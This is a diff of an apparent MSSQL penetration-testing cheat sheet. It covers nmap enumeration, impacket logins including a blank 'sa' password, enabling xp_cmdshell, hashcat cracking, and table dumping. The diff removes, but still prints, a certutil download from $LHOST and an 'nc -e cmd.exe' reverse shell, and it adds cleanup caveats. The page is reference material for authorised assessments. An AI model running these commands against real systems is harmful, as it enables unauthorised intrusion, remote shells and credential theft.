@@ -5470,12 +5470,12 @@
 </div>
 <hr />
 <h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">1433</span><span class="w"> </span>--script<span class="w"> </span>ms-sql-info,ms-sql-ntlm-info,ms-sql-config<span class="w"> </span><span class="nv">$IP</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">1433</span><span class="w"> </span>--script<span class="w"> </span>ms-sql-info,ms-sql-ntlm-info<span class="w"> </span><span class="nv">$IP</span>
 </code></pre></div>
 <hr />
 <h2 id="authentication">Authentication<a class="headerlink" href="#authentication" title="Permanent link">&para;</a></h2>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>impacket-mssqlclient<span class="w"> </span>sa:@<span class="nv">$IP</span>
-<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>impacket-mssqlclient<span class="w"> </span><span class="s1">&#39;$NETBIOS/username&#39;</span>:<span class="s1">&#39;password&#39;</span>@<span class="nv">$IP</span><span class="w"> </span>-windows-auth
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>impacket-mssqlclient<span class="w"> </span>-windows-auth<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">/</span><span class="nv">$USERNAME</span><span class="s2">:</span><span class="nv">$PASSWORD</span><span class="s2">@</span><span class="nv">$IP</span><span class="s2">&quot;</span>
 </code></pre></div>
 <hr />
 <h2 id="brute-force">Brute Force<a class="headerlink" href="#brute-force" title="Permanent link">&para;</a></h2>
@@ -5488,12 +5488,12 @@
 <div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="k">EXEC</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">RECONFIGURE</span><span class="p">;</span>
 <a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="k">EXEC</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;xp_cmdshell&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">RECONFIGURE</span><span class="p">;</span>
 </code></pre></div></p>
+<p>Enabling <code>xp_cmdshell</code> requires <code>sysadmin</code>, changes server configuration, and is logged. Record whether it was already enabled; if the test enabled it, restore the original state afterward.</p>
 <p>Execute commands:
 <div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="k">EXEC</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;whoami&#39;</span><span class="p">;</span>
 </code></pre></div></p>
-<p>Reverse shell via certutil + nc:
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="k">EXEC</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;certutil -urlcache -f http://$LHOST:8000/nc.exe C:\users\public\nc.exe&#39;</span><span class="p">;</span>
-<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="k">EXEC</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;C:\users\public\nc.exe $LHOST 9001 -e cmd.exe&#39;</span><span class="p">;</span>
+<p>Disable it after validation only when it was disabled before the test:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="k">EXEC</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;xp_cmdshell&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">RECONFIGURE</span><span class="p">;</span>
 </code></pre></div></p>
 <hr />
 <h2 id="user-impersonation">User Impersonation<a class="headerlink" href="#user-impersonation" title="Permanent link">&para;</a></h2>
@@ -5511,16 +5511,14 @@
 </code></pre></div>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">1731</span><span class="w"> </span>hashes.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
 </code></pre></div>
+<p>Mode <code>1731</code> applies to SQL Server 2012–2022 verifier version <code>0x02</code>. Older SQL Server hashes use different modes, and SQL Server 2025 introduces verifier version <code>0x03</code>; identify the hash format before cracking.</p>
 <hr />
 <h2 id="quick-sql-reference">Quick SQL Reference<a class="headerlink" href="#quick-sql-reference" title="Permanent link">&para;</a></h2>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">sysdatabases</span><span class="p">;</span><span class="w">                              </span><span class="c1">-- list databases</span>
 <a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">USE</span><span class="w"> </span><span class="n">database_name</span><span class="p">;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sysobjects</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">xtype</span><span class="o">=</span><span class="s1">&#39;U&#39;</span><span class="p">;</span><span class="w">    </span><span class="c1">-- list tables</span>
 <a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="p">;</span><span class="w">                                           </span><span class="c1">-- dump table</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">data_source</span><span class="p">,</span><span class="w"> </span><span class="n">is_linked</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sys</span><span class="p">.</span><span class="n">servers</span><span class="p">;</span><span class="w">               </span><span class="c1">-- linked servers</span>
 </code></pre></div>
-<div class="admonition tip">
-<p class="admonition-title">Real-world</p>
-<p>SA with a blank password is more common than it should be, especially on developer workstations and legacy installations. On internal assessments, also check for linked servers (<code>SELECT * FROM sys.servers</code>), a low-privilege MSSQL instance linked to a high-privilege one is a common lateral movement path.</p>
-</div>
 
 
 
